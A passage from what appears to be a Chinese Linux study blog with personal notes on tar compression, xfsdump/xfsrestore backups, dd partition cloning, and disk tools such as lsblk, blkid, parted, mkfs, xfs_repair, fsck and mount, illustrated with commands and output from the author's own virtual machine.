[sourcefile]</span><br><span class="line">options</span><br><span class="line">-c: 打包文件，-v可以查看打包的文件</span><br><span class="line">-t: 查看打包文件包含了哪些文件</span><br><span class="line">-x: 解包，使用-C后可接解包目录</span><br><span class="line">-z: 通过gzip的形式解压、压缩，建议后缀tar.gz</span><br><span class="line">-j: 通过bizp2的形式压缩、解压，建议后缀tar.bzip2</span><br><span class="line">-J: 通过xz的形式压缩、解压，建议后缀tar.xz</span><br><span class="line">-v: 压缩、解压过程中，显示处理的文件，解压时显示属性权限</span><br><span class="line">-f filename: c&#123;z|j|J&#125; 代表处理后的名字，t|x代表要处理的文件</span><br><span class="line">-C dir: 解压的目录</span><br><span class="line">-p: 保留权限和属性</span><br><span class="line">-P:保留绝对路径</span><br><span class="line">--exclude=FILE: FILE表示这个文件不会被打包</span><br></pre></td></tr></table></figure><p>尝试压缩/etc这个目录的文件，42M的源文件</p><ul><li>纯tar后37M</li><li>gz形式的tar12M</li><li>xz形式的tar8.2M</li></ul><p>1.不过值得一提的是gz花的时间几乎1s，xz花了几乎有半分钟</p><p>2.解压过程中把路径中的<code>/</code>自动去掉了是防止解压时将文件放到/etc中去，要备份<code>/</code>就要加<code>-P</code></p><p>3.使用<code>time 指令</code>会把这个指令花费的时间显示出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># du -sh /etc;ls -lh etc.tar.gz /tmp/etc.tar /tmp/etc.tar.xz </span></span><br><span class="line">42M/etc</span><br><span class="line">-rw-r--r--. 1 root root  12M 1月  12 21:58 etc.tar.gz</span><br><span class="line">-rw-r--r--. 1 root root  37M 1月  12 12:54 /tmp/etc.tar</span><br><span class="line">-rw-r--r--. 1 root root 8.2M 1月  12 22:13 /tmp/etc.tar.xz</span><br></pre></td></tr></table></figure><p><strong>特殊用法</strong></p><ul><li>比如只想解压出包里的一个文件时<ul><li>先用<code>tv</code>查询包得到file</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xv -f .tar file</span><br></pre></td></tr></table></figure><ul><li><p>不想打包包里的某文件时</p><ul><li>–exclude=file</li></ul></li><li><p>打包比某时刻还新的文件</p><ul><li>先确定时间种类和某个时间</li><li>参考指令<code>tar -cv -f filename --newer-mtime=&quot;YYYY/mm/DD&quot; souredir/file</code></li></ul></li></ul><h2 id="四、xfs文件系统备份和还原"><a href="#四、xfs文件系统备份和还原" class="headerlink" title="四、xfs文件系统备份和还原"></a>四、xfs文件系统备份和还原</h2><p>xfsdump&amp;xfsrestore这两个工具对CentOS来说挺重要的，专门针对xfs文件系统</p><h3 id="（一）xfsdump备份xfs文件系统"><a href="#（一）xfsdump备份xfs文件系统" class="headerlink" title="（一）xfsdump备份xfs文件系统"></a>（一）xfsdump备份xfs文件系统</h3><ul><li><p>主要两个功能</p><ol><li>完整的备份整个文件系统</li><li>和以前的备份对比进行增量备份</li></ol></li><li><p><strong>限制</strong></p><ul><li>只能备份挂载的文件系统</li><li>需要神的旨意（root）</li><li>只能搞xfs系统</li><li>恢复只能让xfsrestore解析</li><li><strong>不能备份两个相同UUID的文件系统，因为xfsdump使用UUID来识别每个文件</strong></li></ul></li><li><p>语法</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xfs [-L label] [-M label] [-l <span class="comment">#] [-f file] dumpfile</span></span><br><span class="line">-L: 记录每次备份的session标头，针对该文件系统的简易说明</span><br><span class="line">-M: 记录存储媒介表头，写这个媒介的简易说明</span><br><span class="line">-l: 指定等级0-9，0代表完全备份</span><br><span class="line">-f: 后接备份后的文件名</span><br><span class="line">-I: 从/var/lib/xfsdump/inventory读取备份信息</span><br></pre></td></tr></table></figure><p>例子</p><ul><li>整个备份/boot（注意/boot是一个单独的文件系统）到/srv/boot.dump</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfsdump -l 0 -L boot -M boot -f /srv/boot.dump /boot</span><br></pre></td></tr></table></figure><ul><li>增量备份/boot</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfsdump -l 1 -L boot_1 -M boot_1 -f /srv/boot.dump1 /boot</span><br></pre></td></tr></table></figure><h3 id="（二）系统还原xfsrestore"><a href="#（二）系统还原xfsrestore" class="headerlink" title="（二）系统还原xfsrestore"></a>（二）系统还原xfsrestore</h3><ul><li>简单语法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.xfsrestore - Is</span><br><span class="line">2.xfsrestore [-f backupfile] [-L label] restoredir</span><br><span class="line">3.xfsrestore [-f backupfile] -i restoredir</span><br><span class="line">-I: 与xfsdump -I相同，显示备份信息</span><br><span class="line">-f: 后接备份文件</span><br><span class="line">-L: 后接session的标头</span><br><span class="line">-s: 后接恢复的指定文件和目录</span><br><span class="line">-r: 有磁带时使用</span><br><span class="line">-i: 进入交互模式，高端恢复操作</span><br></pre></td></tr></table></figure><p>例子</p><ul><li>恢复完整的文件系统</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfsrestore -f /srv/boot.dump -L boot /tmp/boot</span><br></pre></td></tr></table></figure><ul><li>恢复增量备份</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfsrestore -f /srv/boot.dump1 -L boot_1 /tmp/boot</span><br></pre></td></tr></table></figure><p>使用<code>diff -r dir1 dir2</code>可以比较连个目录的不同支持</p><ul><li>恢复部分文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># xfsrestore -f /srv/boot.dump -i /tmp/boot</span></span><br><span class="line">xfsrestore: using file dump (drive_simple) strategy</span><br><span class="line">xfsrestore: version 3.1.7 (dump format 3.0) - <span class="built_in">type</span> ^C <span class="keyword">for</span> status and control</span><br><span class="line">xfsrestore: searching media <span class="keyword">for</span> dump</span><br><span class="line">xfsrestore: examining media file 0</span><br><span class="line">xfsrestore: dump description: </span><br><span class="line">xfsrestore: hostname: study.centos.vbird</span><br><span class="line">xfsrestore: mount point: /boot</span><br><span class="line">xfsrestore: volume: /dev/sda2</span><br><span class="line">xfsrestore: session time: Mon Jan 13 21:39:48 2020</span><br><span class="line">xfsrestore: level: 0</span><br><span class="line">xfsrestore: session label: <span class="string">&quot;boot&quot;</span></span><br><span class="line">xfsrestore: media label: <span class="string">&quot;boot&quot;</span></span><br><span class="line">xfsrestore: file system id: 1bedab37-0c01-459c-a8f7-cfd4c5f203f9</span><br><span class="line">xfsrestore: session id: fe824faa-abad-43a8-ae88-9bcfe030fa59</span><br><span class="line">xfsrestore: media id: 705e7452-4a61-4879-bcce-c358b1cfe43d</span><br><span class="line">xfsrestore: using online session inventory</span><br><span class="line">xfsrestore: searching media <span class="keyword">for</span> directory dump</span><br><span class="line">xfsrestore: reading directories</span><br><span class="line">xfsrestore: 11 directories and 339 entries processed</span><br><span class="line">xfsrestore: directory post-processing</span><br><span class="line"></span><br><span class="line"> ========================== subtree selection dialog ==========================</span><br><span class="line"></span><br><span class="line">the following commands are available:</span><br><span class="line"><span class="built_in">pwd</span> </span><br><span class="line">ls [ &lt;path&gt; ]</span><br><span class="line"><span class="built_in">cd</span> [ &lt;path&gt; ]</span><br><span class="line">add [ &lt;path&gt; ]</span><br><span class="line">delete [ &lt;path&gt; ]</span><br><span class="line">extract </span><br><span class="line">quit </span><br><span class="line"><span class="built_in">help</span> </span><br><span class="line"></span><br><span class="line"> -&gt; ls </span><br><span class="line">             114 initramfs-3.10.0-1062.el7.x86_64kdump.img </span><br><span class="line">             113 1.text </span><br><span class="line">              75 initramfs-3.10.0-1062.el7.x86_64.img </span><br><span class="line">              77 vmlinuz-0-rescue-1eb9996494284b65aee1669488d9aae0 </span><br><span class="line">              76 initramfs-0-rescue-1eb9996494284b65aee1669488d9aae0.img </span><br><span class="line">              74 vmlinuz-3.10.0-1062.el7.x86_64 </span><br><span class="line">              73 symvers-3.10.0-1062.el7.x86_64.gz </span><br><span class="line">              72 config-3.10.0-1062.el7.x86_64 </span><br><span class="line">              71 System.map-3.10.0-1062.el7.x86_64 </span><br><span class="line">              70 .vmlinuz-3.10.0-1062.el7.x86_64.hmac </span><br><span class="line">              68 grub/</span><br><span class="line">         1572928 grub2/</span><br><span class="line">              67 efi/</span><br><span class="line"></span><br><span class="line"> -&gt; q   </span><br><span class="line"></span><br><span class="line"> --------------------------------- end dialog ---------------------------------</span><br><span class="line"></span><br><span class="line">xfsrestore: Unmark and quit</span><br><span class="line">xfsrestore: restore complete: 44 seconds elapsed</span><br><span class="line">xfsrestore: Restore Summary:</span><br><span class="line">xfsrestore:   stream 0 /srv/boot.dump OK (success)</span><br><span class="line">xfsrestore: Restore Status: SUCCESS</span><br></pre></td></tr></table></figure><p><code>add</code>添加恢复文件、目录，<code>extract</code>开始恢复</p><p>另外使用<code>-s file/dir</code>也可以恢复指定文件目录</p><h2 id="五、其他压缩备份指令"><a href="#五、其他压缩备份指令" class="headerlink" title="五、其他压缩备份指令"></a>五、其他压缩备份指令</h2><h3 id="dd（disk-dump）"><a href="#dd（disk-dump）" class="headerlink" title="dd（disk dump）"></a>dd（disk dump）</h3><p>常用来备份文件系统，会将文件系统完整的备份，包括UUID</p><p><strong>语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>= of= bs= count=</span><br><span class="line"><span class="keyword">if</span>: input file/dev</span><br><span class="line">of: output file/dev</span><br><span class="line">bs: 每个block的大小，默认512KB</span><br><span class="line">count: block的数量</span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><p>我想把/boot备份一下，步骤如下</p><ul><li>备份的地方：U盘，其他分区等，没多余的U盘，这里我选择分区</li></ul><p>gdisk分出2GB的分区/dev/sda4(容量的要求要比挂载/boot的设备大)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Number  Start (sector)    End (sector)  Size       Code  Name</span><br><span class="line">   1            2048            6143   2.0 MiB     EF02  </span><br><span class="line">   2            6144         2103295   1024.0 MiB  0700  </span><br><span class="line">   3         2103296        65026047   30.0 GiB    8E00  </span><br><span class="line">   4        65026048        69220351   2.0 GiB     8300  Linux filesystem</span><br></pre></td></tr></table></figure><ul><li>使用<code>df /boot</code>查出挂载在/boot的设备</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># df /boot</span></span><br><span class="line">文件系统         1K-块   已用   可用 已用% 挂载点</span><br><span class="line">/dev/sda2      1038336 218416 819920   22% /boot</span><br></pre></td></tr></table></figure><ul><li>使用<code>dd if=/dev/sda2 of=dev/sda4</code>备份</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># dd if=/dev/sda2 of=/dev/sda4</span></span><br><span class="line">记录了2097152+0 的读入</span><br><span class="line">记录了2097152+0 的写出</span><br><span class="line">1073741824字节(1.1 GB)已复制，7.00172 秒，153 MB/秒</span><br></pre></td></tr></table></figure><ul><li><p>因为Linux通过识别UUID来识别设备，而dd将UUID复制过来了，不能直接挂载，需要做准备工作</p><ul><li><code>xfs_repair -L /dev/sda4</code>清除log（日志记录了UUID）</li><li><code>uuidgen</code>产生新<code>UUID</code></li><li><code>xfs_admin -U UUID /dev/sda4</code>自定义UUID</li></ul></li><li><p>此时就算备份完成了，将设备挂载即可</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># mount /dev/sda4 /mnt</span></span><br><span class="line">[root@study /]<span class="comment"># df -h /mnt /boot</span></span><br><span class="line">文件系统        容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/sda4      1014M  214M  801M   22% /mnt</span><br><span class="line">/dev/sda2      1014M  214M  801M   22% /boot</span><br></pre></td></tr></table></figure><p>可以发现备份的sda4与sda2一模一样，但是有个小问题，我原本的sda4是有2G的，怎么变成1G了？</p><p>那是因为dd将sda2的所有信息都拷过来了，分区，格式，元数据，导致两个硬盘一模一样，这时候需要执行<code>xfs_growfs /mnt</code>即可（具体原因在未来的章节）</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 压缩 </tag>
            
            <tag> backups </tag>
            
            <tag> xfsdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（六）管理磁盘</title>
      <link href="/Linux/6.%E7%AE%A1%E7%90%86%E7%A3%81%E7%9B%98.html"/>
      <url>/Linux/6.%E7%AE%A1%E7%90%86%E7%A3%81%E7%9B%98.html</url>
      
        <content type="html"><![CDATA[<p> 该调教一个磁盘了</p><span id="more"></span><h2 id="新磁盘"><a href="#新磁盘" class="headerlink" title="新磁盘"></a>新磁盘</h2><p>得到一块磁盘，要进行一下操作</p><ol><li>建立硬盘分区</li><li>对分区进行<strong>format</strong>（格式化），建立文件系统</li><li>然后可以对文件系统检验一下</li><li>最后挂载才能使用</li></ol><h2 id="观察磁盘分区状态"><a href="#观察磁盘分区状态" class="headerlink" title="观察磁盘分区状态"></a>观察磁盘分区状态</h2><h3 id="lsblk"><a href="#lsblk" class="headerlink" title="lsblk"></a>lsblk</h3><ul><li>list block devices，列出所有存储设备</li><li><code>lsblk [-] [device]</code></li><li><code>-d</code>列出磁盘本身，不列出分区数据</li><li><code>-f</code>同时列出磁盘内文件系统名字</li><li><code>-i</code>使用ASCII的字符输出，而不用复杂的编码</li><li><code>-m</code>输出设备在/dev的权限信息</li><li><code>-p</code>列出设备的完整文件名</li><li><code>-t</code>列出详细数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ lsblk</span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda               8:0    0   40G  0 disk </span><br><span class="line">├─sda1            8:1    0    2M  0 part </span><br><span class="line">├─sda2            8:2    0    1G  0 part /boot</span><br><span class="line">└─sda3            8:3    0   30G  0 part </span><br><span class="line">  ├─centos-root 253:0    0   10G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0    2G  0 lvm  [SWAP]</span><br><span class="line">  └─centos-home 253:2    0    5G  0 lvm  /home</span><br><span class="line">sr0              11:0    1 10.3G  0 rom  /run/media/manu/CentOS 7 x86_64</span><br></pre></td></tr></table></figure><ul><li><code>NAME</code>设备名</li><li><code>MAJ:MIN</code>主要设备和次要设备代码</li><li><code>RM</code>是否为可卸载设备（remove device），如光盘,usb等</li><li><code>SIZE</code>容量</li><li><code>RO</code>是否只读</li><li><code>TYPE</code>有磁盘disk，分区partition，和只读存储器rom等</li><li><code>MOUNTPOINT</code>挂载点</li></ul><h3 id="blkid"><a href="#blkid" class="headerlink" title="blkid"></a>blkid</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># blkid</span></span><br><span class="line">/dev/sda1: PARTUUID=<span class="string">&quot;0914c759-c4fa-4ec5-8f17-286976c070d1&quot;</span> </span><br><span class="line">/dev/sda2: UUID=<span class="string">&quot;1bedab37-0c01-459c-a8f7-cfd4c5f203f9&quot;</span> TYPE=<span class="string">&quot;xfs&quot;</span> PARTUUID=<span class="string">&quot;83aceed5-29cd-45df-9151-9f450ccdadfa&quot;</span> </span><br><span class="line">/dev/sda3: UUID=<span class="string">&quot;YUgqln-n8fP-6ecM-NMyS-lGlw-PTrz-KTxWfv&quot;</span> TYPE=<span class="string">&quot;LVM2_member&quot;</span> PARTUUID=<span class="string">&quot;522d939a-fc63-4e61-af9e-6f66527afcb5&quot;</span> </span><br><span class="line">/dev/sr0: UUID=<span class="string">&quot;2019-09-09-19-08-41-00&quot;</span> LABEL=<span class="string">&quot;CentOS 7 x86_64&quot;</span> TYPE=<span class="string">&quot;iso9660&quot;</span> PTTYPE=<span class="string">&quot;dos&quot;</span> </span><br><span class="line">/dev/mapper/centos-root: UUID=<span class="string">&quot;5b52ce1c-18f5-43d0-8c31-ededfefd6aeb&quot;</span> TYPE=<span class="string">&quot;xfs&quot;</span> </span><br><span class="line">/dev/mapper/centos-swap: UUID=<span class="string">&quot;080b56ed-a551-4b09-ab36-43515cdb2b78&quot;</span> TYPE=<span class="string">&quot;swap&quot;</span> </span><br><span class="line">/dev/mapper/centos-home: UUID=<span class="string">&quot;8eccf850-c8c0-4aab-a24a-55f5b4ef0dbe&quot;</span> TYPE=<span class="string">&quot;xfs&quot;</span> </span><br></pre></td></tr></table></figure><p>UUID是<strong>通用唯一标识符</strong>（Universally unique identifer），Linux会给每个设备独一无二的标识符</p><h3 id="parted"><a href="#parted" class="headerlink" title="parted"></a>parted</h3><ul><li>列出磁盘的分区类型与分区信息</li><li><code>parted dev_name print</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># parted /dev/sda print</span></span><br><span class="line">Model: VMware, VMware Virtual S (scsi)<span class="comment">#磁盘模块名称</span></span><br><span class="line">Disk /dev/sda: 42.9GB<span class="comment">#总容量</span></span><br><span class="line">Sector size (logical/physical): 512B/512B<span class="comment">#每个逻辑/物理扇区容量</span></span><br><span class="line">Partition Table: gpt<span class="comment">#分区表格式</span></span><br><span class="line">Disk Flags: pmbr_boot</span><br><span class="line"></span><br><span class="line">Number  Start   End     Size    File system  Name  标志</span><br><span class="line"> 1      1049kB  3146kB  2097kB                     bios_grub</span><br><span class="line"> 2      3146kB  1077MB  1074MB  xfs</span><br><span class="line"> 3      1077MB  33.3GB  32.2GB                     lvm</span><br></pre></td></tr></table></figure><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><ul><li>GPT使用<code>gdisk</code>工具</li><li>MBR使用<code>fdisk</code>工具</li><li>使用完后可以用partprobe -s指令更新内核的分区表</li></ul><p>不要去操作一个正在活动的分区，会导致系统不稳定，最好将它卸载再操作</p><h2 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h2><p>也就是格式化，使用mkfs创建文件系统，以下是支持的文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># mkfs</span></span><br><span class="line">mkfs         mkfs.btrfs   mkfs.cramfs  mkfs.ext2    mkfs.ext3    mkfs.ext4    mkfs.fat     mkfs.minix   mkfs.msdos   mkfs.vfat    mkfs.xfs   </span><br></pre></td></tr></table></figure><p>可以使用<code>mkfs -t fsname partition</code>或者<code>mkfs.fsname partition</code>创建</p><p>创建xfs几乎瞬间完成，而ext4则是等了一会</p><p>其实创建时有很多选项，有关于RAID的，但都要对文件系统有所了解，针对性的创建对性能有一定的优化，想要加一些选项的话，自己man吧</p><h2 id="文件系统检验"><a href="#文件系统检验" class="headerlink" title="文件系统检验"></a>文件系统检验</h2><p>突发情况文件系统会发生错乱，这时候就需要检验文件系统</p><h3 id="xfs-repair"><a href="#xfs-repair" class="headerlink" title="xfs_repair"></a>xfs_repair</h3><ul><li><code>xfs_repair [-fnd] 某个分区</code></li><li><code>-f</code>后面的设备其实是个文件<ul><li>官方原文：Specifies that the filesystem image to be processed is stored in a regular file at device (see the mkfs.xfs -d file option). This might happen if an image copy of a filesystem has been copied or written into an ordinary file.  This option implies that any external log or realtime section is also in an  ordi‐nary file.</li></ul></li><li><code>-n</code>只是检查而不修改任何数据</li><li><code>-d</code>在单人维护模式下对根目录操作</li><li><code>-L</code>Force  Log Zeroing. </li></ul><p>挂载的文件系统要卸载才能操作</p><h3 id="fsck-ext4"><a href="#fsck-ext4" class="headerlink" title="fsck.ext4"></a>fsck.ext4</h3><p>可以对ext4检查</p><ul><li><code>-p</code>需要修复时，不用你输入y</li><li><code>-f</code>强制检查，一般只有遇到unclean才会强制检查</li><li><code>-b</code>后接超级区块的位置（使用dumpe2fs可以查看），超级区块损坏时使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># dumpe2fs -h /dev/sda5 | grep &#x27;Blocks per group&#x27;</span></span><br><span class="line">dumpe2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Blocks per group:         32768</span><br></pre></td></tr></table></figure><blockquote><p>grep可以锁定某一串字符</p></blockquote><p>我尝试用书上的指令检查了一下sda5，发现和书上发生了相同的问题，这么巧合？？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># fsck.ext4 -b 32768 /dev/sda5</span></span><br><span class="line">e2fsck 1.42.9 (28-Dec-2013)</span><br><span class="line">/dev/sda5 was not cleanly unmounted, 强制检查.</span><br><span class="line">第一步: 检查inode,块,和大小</span><br><span class="line">删除 inode 1577 has zero dtime.  处理&lt;y&gt;? 是</span><br><span class="line">第二步: 检查目录结构</span><br><span class="line">第3步: 检查目录连接性</span><br><span class="line">Pass 4: Checking reference counts</span><br><span class="line">第5步: 检查簇概要信息</span><br><span class="line"></span><br><span class="line">/dev/sda5: ***** 文件系统已修改 *****</span><br><span class="line">/dev/sda5: 11/65536 files (0.0% non-contiguous), 12955/262144 blocks</span><br></pre></td></tr></table></figure><p>只有出问题才去检查文件系统，没事别使用</p><p>执行命令的硬盘分区都要卸载</p><h2 id="挂载和卸载"><a href="#挂载和卸载" class="headerlink" title="挂载和卸载"></a>挂载和卸载</h2><p>挂载前要注意</p><ol><li>单一文件系统不能重复挂载在其他目录</li><li>单一目录不能挂载多个文件系统</li><li>挂载点的目录最好是空的</li></ol><h3 id="挂载指令mount"><a href="#挂载指令mount" class="headerlink" title="挂载指令mount"></a>挂载指令mount</h3><ul><li><p><code>mount -a</code>照/etc/fstab的数据将未挂载的磁盘全部挂载</p></li><li><p><code>mount [-l]</code>默认显示当前挂载信息，加上l显示laber</p></li><li><p><code>mount  [-t fs] LABEL=&#39;&#39; dir</code></p></li><li><p><code>mount  [-t fs] UUID=&#39;&#39; dir</code></p></li><li><p><code>mount  [-t fs] dev dir</code></p></li><li><p>其实mount很复杂，更多信息还是man</p></li><li><p>mount默认只有root才能执行</p></li><li><p>实际上不加t选项也行，系统知道该是什么文件系统，我们在格式化就已经弄好了</p></li><li><p>在命令行挂载光盘后，无法退出光驱，要先卸载</p></li></ul><blockquote><p>那么Linux是怎么识别这些文件系统类型的呢？</p><p>Linux通过分析super block加上自己的驱动来测试挂载，测试成功就自动挂载，测试参考两个文件</p><ol><li>/etc/filesystems：测试挂载fs的优先级</li><li>/proc/filesystems：已挂载的fs</li></ol><p>驱动写在下面的文件中</p><ul><li>/lib/modules/$(uname -r)/kernel/fs/</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># cd /lib/modules/$(uname -r)/kernel/fs/</span></span><br><span class="line">[root@study fs]<span class="comment"># ls</span></span><br><span class="line">binfmt_misc.ko.xz  cachefiles  cifs    dlm    ext4  fscache  gfs2   jbd2   mbcache.ko.xz  nfs_common  nls        pstore    udf</span><br><span class="line">btrfs              ceph        cramfs  exofs  fat   fuse     isofs  lockd  nfs            nfsd        overlayfs  squashfs  xfs</span><br></pre></td></tr></table></figure></blockquote><h3 id="挂载vfat移动磁盘"><a href="#挂载vfat移动磁盘" class="headerlink" title="挂载vfat移动磁盘"></a>挂载vfat移动磁盘</h3><p>挂载时可以指定文件系统的语系，中文语系是950，By default, codepage 437 is used.还可以指定编码，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o codepage=950,iocharset=utf-8 UUID=<span class="string">&#x27;&#x27;</span> dir</span><br></pre></td></tr></table></figure><p>如果磁盘是NTFS，那么需要安装NTFS的驱动才行</p><h3 id="重新挂载根木目录"><a href="#重新挂载根木目录" class="headerlink" title="重新挂载根木目录"></a>重新挂载根木目录</h3><p>根目录是不能卸载的，若根目录出现只读的状态，处理的办法有</p><ol><li>reboot</li><li>重新挂载，输入<code>mount -o remount,rw,auto /</code></li></ol><h3 id="挂载文件结构层次"><a href="#挂载文件结构层次" class="headerlink" title="挂载文件结构层次"></a>挂载文件结构层次</h3><p>我的理解就是类似符号链接一样，将这个目录挂载到其他的目录，两个目录都链接到了同一个inode</p><p>指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount --<span class="built_in">bind</span> olddir dir</span><br></pre></td></tr></table></figure><h3 id="umount卸载"><a href="#umount卸载" class="headerlink" title="umount卸载"></a>umount卸载</h3><ul><li><code>umount [-fn] 设备名或者挂载点</code></li><li><code>-f</code>强制卸载</li><li><code>-l</code>立刻卸载</li><li><code>-n</code>不更新/etc/mtab情况下卸载</li><li>不过要注意，要离开这个挂载点才能卸载</li></ul><h2 id="磁盘、文件系统参数自定义"><a href="#磁盘、文件系统参数自定义" class="headerlink" title="磁盘、文件系统参数自定义"></a>磁盘、文件系统参数自定义</h2><h3 id="mknod"><a href="#mknod" class="headerlink" title="mknod"></a>mknod</h3><p>Linux的文件代表设备，就是通过文件的major和minor数值来代替的，比如下面的8和0,1,2,3..就是major和minor，更多信息<a href="https://www.kernel.org/doc/html/latest/admin-guide/devices.html">https://www.kernel.org/doc/html/latest/admin-guide/devices.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ ll /dev/sda*</span><br><span class="line">brw-rw----. 1 root disk 8, 0 1月  10 03:22 /dev/sda</span><br><span class="line">brw-rw----. 1 root disk 8, 1 1月  10 03:22 /dev/sda1</span><br><span class="line">brw-rw----. 1 root disk 8, 2 1月  10 03:22 /dev/sda2</span><br><span class="line">brw-rw----. 1 root disk 8, 3 1月  10 03:22 